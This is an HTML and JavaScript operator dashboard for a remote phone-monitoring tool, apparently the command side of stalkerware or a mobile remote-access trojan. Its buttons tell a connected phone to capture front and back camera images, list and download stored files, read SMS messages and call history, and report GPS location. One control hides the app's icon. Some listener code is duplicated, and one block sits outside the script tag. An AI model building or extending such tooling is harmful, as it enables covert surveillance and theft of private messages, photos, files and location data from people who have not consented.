<!DOCTYPE html>
<html>
<head>
    <title>Monitor Control Center</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
        .status-dot { height: 12px; width: 12px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        button { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        .btn-blue { background: #007bff; color: white; }
        .btn-green { background: #28a745; color: white; }
        .btn-red { background: #dc3545; color: white; }
        #log-screen { background: black; color: #00ff00; height: 150px; overflow-y: auto; padding: 10px; font-family: monospace; font-size: 13px; border: 1px solid #444; margin-top: 10px; }
        img { width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid #555; }
    </style>
</head>
<body>

    <div class="header">
        <h2>üì± Device Monitor</h2>
        <div>
            <span id="dot" class="status-dot" style="background: red;"></span>
            <span id="status-text">Disconnected</span>
        </div>
    </div>
<div class="grid">
    <div class="card" style="grid-column: span 2;">
        <h3>üî¥ Live Monitor (Video/Photo)</h3>
        <div id="video-container" style="background:#000; min-height:400px; display:flex; align-items:center; justify-content:center;">
            <img id="live-frame" src="" style="display:none; width:100%; max-height:600px; object-fit:contain;">
            <p id="video-placeholder" style="color:#666;">No Live Feed Active</p>
        </div>
        <div style="display:flex; gap:10px; margin-top:10px;">
            <button class="btn-green" onclick="sendCmd('camera-back')">üì∏ Back Frame</button>
            <button class="btn-green" onclick="sendCmd('camera-front')">üì∏ Front Frame</button>
        </div>
    </div>

    <div class="card">
        <h3>üìÇ File Manager</h3>
        <button class="btn-blue" onclick="sendCmd('get-files')">Scan Storage</button>
        <div id="file-list" style="height:250px; overflow-y:auto; background:#111; padding:10px; font-size:12px;">
            Files will appear here...
        </div>
    </div>
</div>
    <div class="grid">
        <div class="card">
            <h3>üîã Device Status</h3>
            <p>Battery: <span id="battery">--</span>%</p>
            <p>Location: <span id="location">Waiting...</span></p>
            <button class="btn-blue" onclick="sendCmd('get-gps')">Update GPS Now</button>
        </div>

        <div class="card">
            <h3>üì∑ Live Capture</h3>
            <button class="btn-green" onclick="sendCmd('camera-back')">Capture Back Cam</button>
            <button class="btn-green" onclick="sendCmd('camera-front')">Capture Front Cam</button>
            <div id="cam-view"></div>
        </div>

        <div class="card">
            <h3>üìÇ Data Logs</h3>
            <button class="btn-blue" onclick="sendCmd('get-sms')">Read SMS</button>
            <button class="btn-blue" onclick="sendCmd('get-calls')">Call History</button>
            <button class="btn-red" onclick="sendCmd('hide-icon')">Stealth: Hide Icon</button>
            <button class="btn-green" onclick="sendCmd('show-icon')">Show Icon</button>
            <div id="log-screen">> System Ready...</div>
        </div>
    </div>

    <script>
        const socket = io();
        const log = document.getElementById('log-screen');

        socket.on('connect', () => {
            document.getElementById('dot').style.background = "#28a745";
            document.getElementById('status-text').innerText = "Connected to Server";
            log.innerHTML += "<br>> Connection Established";
        });

        socket.on('disconnect', () => {
            document.getElementById('dot').style.background = "red";
            document.getElementById('status-text').innerText = "Server Offline";
        });
// Handle Live Image/Video Stream
    socket.on('data-stream', (base64) => {
        const img = document.getElementById('live-frame');
        const placeholder = document.getElementById('video-placeholder');
        placeholder.style.display = 'none';
        img.style.display = 'block';
        img.src = "data:image/jpeg;base64," + base64;
    });

    // Handle File List and generate Download Buttons
    socket.on('file-data', (data) => {
        const files = JSON.parse(data);
        let html = "<ul style='list-style:none; padding:0;'>";
        files.forEach(f => {
            const icon = f.d ? "üìÅ" : "üìÑ";
            html += `<li style='padding:5px; border-bottom:1px solid #333;'>
                ${icon} ${f.n} 
                ${!f.d ? `<button onclick="downloadFile('${f.n}')" style="width:auto; padding:2px 8px; font-size:10px; float:right;">Download</button>` : ''}
            </li>`;
        });
        document.getElementById('file-list').innerHTML = html + "</ul>";
    });

    function downloadFile(name) {
        sendCmd('download:' + name);
        log.innerHTML += `<br>> Requesting download: ${name}`;
    }

    // Capture the incoming file data and force browser download
    socket.on('file-download-ready', (fileObj) => {
        const link = document.createElement('a');
        link.href = "data:application/octet-stream;base64," + fileObj.data;
        link.download = fileObj.name;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        log.innerHTML += `<br>> Success: ${fileObj.name} downloaded!`;
    });
        function sendCmd(cmd) {
            socket.emit('phone-execute', cmd);
            log.innerHTML += `<br>> Executing: ${cmd}`;
        }

        // Listen for Battery
        socket.on('battery-update', (data) => {
            document.getElementById('battery').innerText = data;
        });

        // Listen for Location
        socket.on('location-update', (data) => {
            document.getElementById('location').innerHTML = 
                `<a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" style="color:#007bff">View on Map</a>`;
        });

        // Listen for Image
        socket.on('data-stream', (base64) => {
            document.getElementById('cam-view').innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
            log.innerHTML += "<br>> Image Received";
        });

        // Listen for SMS/Calls
        socket.on('sms-data', (data) => {
            log.innerHTML = "<b>SMS INBOX:</b><br>" + JSON.stringify(data, null, 2);
        });

        socket.on('call-data', (data) => {
            log.innerHTML = "<b>CALL LOGS:</b><br>" + JSON.stringify(data, null, 2);
        });
    </script>
    // --- Refined SMS Listener ---
socket.on('sms-data', (data) => {
    const logs = JSON.parse(data);
    let html = "<h4>üì© Recent SMS</h4><table style='width:100%; text-align:left; border-collapse:collapse;'>";
    html += "<tr style='border-bottom:1px solid #444'><th>From</th><th>Message</th></tr>";
    
    logs.forEach(msg => {
        html += `<tr style='border-bottom:1px solid #333; font-size:12px;'>
                    <td style='padding:5px; color:#007bff;'>${msg.from}</td>
                    <td style='padding:5px;'>${msg.body}</td>
                 </tr>`;
    });
    
    html += "</table>";
    document.getElementById('log-screen').innerHTML = html;
});

// --- Refined Call Log Listener ---
socket.on('call-data', (data) => {
    const logs = JSON.parse(data);
    let html = "<h4>üìû Recent Calls</h4><table style='width:100%; text-align:left;'>";
    html += "<tr><th>Number</th></tr>";
    
    logs.forEach(call => {
        html += `<tr style='border-bottom:1px solid #333;'>
                    <td style='padding:5px; color:#28a745;'>${call.num}</td>
                 </tr>`;
    });
    
    html += "</table>";
    document.getElementById('log-screen').innerHTML = html;
});
</body>
</html>



